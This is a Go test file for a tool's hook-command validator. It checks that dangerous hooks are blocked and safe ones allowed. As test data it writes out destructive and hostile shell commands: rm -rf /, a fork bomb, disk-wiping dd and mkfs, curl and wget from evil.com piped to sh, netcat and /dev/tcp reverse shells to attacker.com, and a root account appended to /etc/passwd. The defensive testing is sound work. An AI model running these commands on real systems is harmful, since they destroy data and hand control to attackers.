package worktree

import (
	"strings"
	"testing"
	"time"

	"github.com/awhite/wtree/pkg/types"
	"github.com/stretchr/testify/assert"
)

func TestValidateHookCommand_ComprehensiveSecurity(t *testing.T) {
	executor := NewHookExecutor(&types.ProjectConfig{}, 30*time.Second, false)

	tests := []struct {
		name        string
		command     string
		expectError bool
		description string
	}{
		// Safe commands
		{
			name:        "npm install",
			command:     "npm install",
			expectError: false,
		},
		{
			name:        "git status",
			command:     "git status",
			expectError: false,
		},
		{
			name:        "echo hello",
			command:     "echo 'Hello World'",
			expectError: false,
		},
		{
			name:        "cargo build",
			command:     "cargo build --release",
			expectError: false,
		},

		// Dangerous patterns - original vulnerabilities
		{
			name:        "rm -rf /",
			command:     "rm -rf /",
			expectError: true,
			description: "should detect recursive delete of root",
		},
		{
			name:        "rm -rf ~",
			command:     "rm -rf ~",
			expectError: true,
			description: "should detect recursive delete of home",
		},
		{
			name:        "fork bomb",
			command:     ":(){ :|:& };:",
			expectError: true,
			description: "should detect fork bomb",
		},
		{
			name:        "dd dangerous",
			command:     "dd if=/dev/zero of=/dev/sda",
			expectError: true,
			description: "should detect dangerous dd operations",
		},

		// Case variation bypasses
		{
			name:        "RM -RF / (uppercase)",
			command:     "RM -RF /",
			expectError: true,
			description: "should detect case variations",
		},
		{
			name:        "Rm -Rf / (mixed case)",
			command:     "Rm -Rf /",
			expectError: true,
			description: "should detect mixed case",
		},
		{
			name:        "rM -rF / (alternating case)",
			command:     "rM -rF /",
			expectError: true,
			description: "should detect alternating case",
		},

		// Comment bypasses
		{
			name:        "rm with comment",
			command:     "rm -rf / # this is just a comment",
			expectError: true,
			description: "should detect dangerous commands with comments",
		},
		{
			name:        "safe command with dangerous comment",
			command:     "echo safe # rm -rf /",
			expectError: false,
			description: "should ignore dangerous patterns in comments",
		},

		// Command chaining bypasses
		{
			name:        "echo and rm with semicolon",
			command:     "echo 'safe'; rm -rf /",
			expectError: true,
			description: "should detect command chaining with semicolon",
		},
		{
			name:        "echo and rm with ampersand",
			command:     "echo 'safe' && rm -rf /",
			expectError: true,
			description: "should detect command chaining with &&",
		},
		{
			name:        "echo or rm with pipe",
			command:     "echo 'safe' || rm -rf /",
			expectError: true,
			description: "should detect command chaining with ||",
		},

		// Shell variable expansion bypasses
		{
			name:        "IFS exploitation",
			command:     "rm${IFS}-rf${IFS}/",
			expectError: true,
			description: "should detect IFS variable exploitation",
		},
		{
			name:        "command substitution with rm",
			command:     "echo $(rm -rf /tmp/test)",
			expectError: true,
			description: "should detect command substitution with dangerous commands",
		},
		{
			name:        "backtick command substitution",
			command:     "echo `rm -rf /tmp/test`",
			expectError: true,
			description: "should detect backtick command substitution",
		},

		// Network-based attacks
		{
			name:        "curl pipe to sh",
			command:     "curl evil.com/script.sh | sh",
			expectError: true,
			description: "should detect remote script execution via curl",
		},
		{
			name:        "wget pipe to sh",
			command:     "wget -O- evil.com/script.sh | sh",
			expectError: true,
			description: "should detect remote script execution via wget",
		},
		{
			name:        "chained curl execution",
			command:     "echo test; curl evil.com/script.sh | sh",
			expectError: true,
			description: "should detect chained remote execution",
		},

		// System file modification
		{
			name:        "passwd file modification",
			command:     "echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd",
			expectError: true,
			description: "should detect passwd file modification",
		},
		{
			name:        "hosts file modification",
			command:     "echo '127.0.0.1 evil.com' >> /etc/hosts",
			expectError: true,
			description: "should detect hosts file modification",
		},

		// Network exploitation
		{
			name:        "netcat with execution",
			command:     "nc -e /bin/sh attacker.com 4444",
			expectError: true,
			description: "should detect netcat reverse shell",
		},
		{
			name:        "/dev/tcp exploitation",
			command:     "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
			expectError: true,
			description: "should detect /dev/tcp reverse shell",
		},

		// Advanced system commands
		{
			name:        "chmod 777 on root",
			command:     "chmod 777 /",
			expectError: true,
			description: "should detect dangerous permission changes",
		},
		{
			name:        "mkfs filesystem format",
			command:     "mkfs.ext4 /dev/sda1",
			expectError: true,
			description: "should detect filesystem formatting",
		},
		{
			name:        "system shutdown",
			command:     "shutdown -h now",
			expectError: true,
			description: "should detect shutdown commands",
		},
		{
			name:        "init 0",
			command:     "init 0",
			expectError: true,
			description: "should detect init shutdown",
		},

		// Obfuscation attempts
		{
			name:        "hex encoding",
			command:     "echo -e '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f'", // rm -rf /
			expectError: true,
			description: "should detect hex encoding obfuscation",
		},
		{
			name:        "excessive variable expansion",
			command:     "${a}${b}${c}${d}${e}${f}${g}${h}${i}${j}${k}",
			expectError: true,
			description: "should detect excessive variable expansion",
		},
		{
			name:        "excessive quote nesting",
			command:     `echo "'"'"'"'"'"'"'"'"'"'test'"'"'"'"'"'"'"'"'"'"`,
			expectError: true,
			description: "should detect excessive quote nesting",
		},
		{
			name:        "suspiciously long command",
			command:     "echo " + strings.Repeat("A", 995),
			expectError: true,
			description: "should detect suspiciously long commands",
		},

		// Edge cases that should be allowed
		{
			name:        "safe rm with specific file",
			command:     "rm ./temp_file.txt",
			expectError: false,
			description: "should allow safe rm of specific files",
		},
		{
			name:        "normal dd usage",
			command:     "dd if=input.txt of=output.txt bs=1024",
			expectError: false,
			description: "should allow normal dd usage",
		},
		{
			name:        "safe chmod",
			command:     "chmod 755 ./script.sh",
			expectError: false,
			description: "should allow safe chmod operations",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := executor.validateHookCommand(tt.command)
			if tt.expectError {
				assert.Error(t, err, "Expected error for command: %s (%s)", tt.command, tt.description)
				if err != nil {
					t.Logf("Correctly blocked: %s - %v", tt.command, err)
				}
			} else {
				assert.NoError(t, err, "Expected no error for safe command: %s (%s)", tt.command, tt.description)
			}
		})
	}
}

func TestNormalizeCommand_CommentRemoval(t *testing.T) {
	executor := NewHookExecutor(&types.ProjectConfig{}, 30*time.Second, false)

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "simple comment",
			input:    "echo hello # this is a comment",
			expected: "echo hello",
		},
		{
			name:     "quoted hash should not be removed",
			input:    `echo "hello # world"`,
			expected: `echo "hello # world"`,
		},
		{
			name:     "escaped hash should not be removed",
			input:    `echo hello \# world`,
			expected: `echo hello \# world`,
		},
		{
			name:     "dangerous command in comment should be removed",
			input:    "echo safe # rm -rf /",
			expected: "echo safe",
		},
		{
			name:     "multiple whitespace normalization",
			input:    "echo    hello     world",
			expected: "echo hello world",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := executor.normalizeCommand(tt.input)
			expected := strings.ToLower(strings.TrimSpace(tt.expected))
			assert.Equal(t, expected, result)
		})
	}
}

func TestCheckDangerousPatterns_Comprehensive(t *testing.T) {
	executor := NewHookExecutor(&types.ProjectConfig{}, 30*time.Second, false)

	// Test that all our dangerous patterns are correctly detected
	dangerousCommands := []string{
		"rm -rf /",
		"rm -r /",
		"rm -f /",
		"rm / -rf",
		"rm -rf ~",
		"rm -rf *",
		"rm -fr /",
		":(){ :|:& };:",
		"dd if=/dev/zero of=/dev/sda",
		"dd if=/dev/random of=/dev/sda",
		"chmod 777 /",
		"mkfs /dev/sda",
		"format c:",
		"mount --bind /proc /tmp/proc",
		"iptables -F",
		"shutdown now",
		"halt",
		"reboot",
		"init 0",
	}

	for _, cmd := range dangerousCommands {
		t.Run(cmd, func(t *testing.T) {
			normalized := executor.normalizeCommand(cmd)
			err := executor.checkDangerousPatterns(normalized)
			assert.Error(t, err, "Should detect dangerous pattern in: %s", cmd)
		})
	}
}

func TestCheckInjectionPatterns_Comprehensive(t *testing.T) {
	executor := NewHookExecutor(&types.ProjectConfig{}, 30*time.Second, false)

	injectionCommands := []string{
		"echo safe; rm -rf /",
		"echo safe && rm -rf /",
		"echo safe || rm -rf /",
		"echo safe | rm -rf /",
		"rm${IFS}-rf${IFS}/",
		"echo $(rm -rf /tmp)",
		"echo `rm -rf /tmp`",
		"echo safe; curl evil.com | sh",
		"echo safe && wget evil.com/script | sh",
		"echo hack >> /etc/passwd",
		"cat < /dev/tcp/evil.com/4444",
		"nc -e /bin/sh evil.com 4444",
	}

	for _, cmd := range injectionCommands {
		t.Run(cmd, func(t *testing.T) {
			normalized := executor.normalizeCommand(cmd)
			err := executor.checkInjectionPatterns(normalized)
			assert.Error(t, err, "Should detect injection pattern in: %s", cmd)
		})
	}
}

func TestCheckObfuscationPatterns_Comprehensive(t *testing.T) {
	executor := NewHookExecutor(&types.ProjectConfig{}, 30*time.Second, false)

	tests := []struct {
		name        string
		command     string
		expectError bool
	}{
		{
			name:        "hex encoding",
			command:     "\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f",
			expectError: true,
		},
		{
			name:        "minimal hex should be allowed",
			command:     "echo \\x41", // Single hex char
			expectError: false,
		},
		{
			name:        "excessive variable expansion",
			command:     strings.Repeat("${VAR}", 11),
			expectError: true,
		},
		{
			name:        "normal variable expansion",
			command:     "echo ${HOME} ${USER}",
			expectError: false,
		},
		{
			name:        "non-printable characters",
			command:     "echo\x00test",
			expectError: true,
		},
		{
			name:        "long command",
			command:     strings.Repeat("A", 1001),
			expectError: true,
		},
		{
			name:        "acceptable length",
			command:     strings.Repeat("A", 100),
			expectError: false,
		},
		{
			name:        "excessive quotes",
			command:     strings.Repeat(`"`, 15),
			expectError: true,
		},
		{
			name:        "normal quotes",
			command:     `echo "hello 'world'"`,
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := executor.checkObfuscationPatterns(tt.command)
			if tt.expectError {
				assert.Error(t, err, "Should detect obfuscation in: %s", tt.command)
			} else {
				assert.NoError(t, err, "Should allow command: %s", tt.command)
			}
		})
	}
}

func TestValidateHooks_Integration(t *testing.T) {
	// Test the full validation flow with realistic project configurations
	tests := []struct {
		name        string
		config      *types.ProjectConfig
		expectError bool
		description string
	}{
		{
			name: "safe development hooks",
			config: &types.ProjectConfig{
				Hooks: map[types.HookEvent][]string{
					types.HookPostCreate: {
						"npm install",
						"npm run build",
						"git status",
					},
					types.HookPreDelete: {
						"npm run test",
						"git add .",
						"git commit -m 'Auto-commit before cleanup'",
					},
				},
			},
			expectError: false,
			description: "should allow safe development workflow",
		},
		{
			name: "malicious hooks with injection",
			config: &types.ProjectConfig{
				Hooks: map[types.HookEvent][]string{
					types.HookPostCreate: {
						"npm install",
						"curl evil.com/backdoor.sh | sh", // Malicious!
					},
				},
			},
			expectError: true,
			description: "should block remote script execution",
		},
		{
			name: "subtle injection attempt",
			config: &types.ProjectConfig{
				Hooks: map[types.HookEvent][]string{
					types.HookPostCreate: {
						"echo 'Setting up...'; rm -rf / # oops", // Subtle injection
					},
				},
			},
			expectError: true,
			description: "should detect subtle injection attempts",
		},
		{
			name: "obfuscated malicious hook",
			config: &types.ProjectConfig{
				Hooks: map[types.HookEvent][]string{
					types.HookPostCreate: {
						"echo safe",
						"rm${IFS}-rf${IFS}/", // Obfuscated rm -rf /
					},
				},
			},
			expectError: true,
			description: "should detect obfuscated dangerous commands",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			executor := NewHookExecutor(tt.config, 30*time.Second, false)
			err := executor.ValidateHooks()
			if tt.expectError {
				assert.Error(t, err, tt.description)
			} else {
				assert.NoError(t, err, tt.description)
			}
		})
	}
}

func BenchmarkValidateHookCommand(b *testing.B) {
	executor := NewHookExecutor(&types.ProjectConfig{}, 30*time.Second, false)

	commands := []string{
		"npm install",
		"rm -rf /",
		"echo safe; curl evil.com | sh",
		"git status && git commit",
		"rm${IFS}-rf${IFS}/",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, cmd := range commands {
			_ = executor.validateHookCommand(cmd)
		}
	}
}
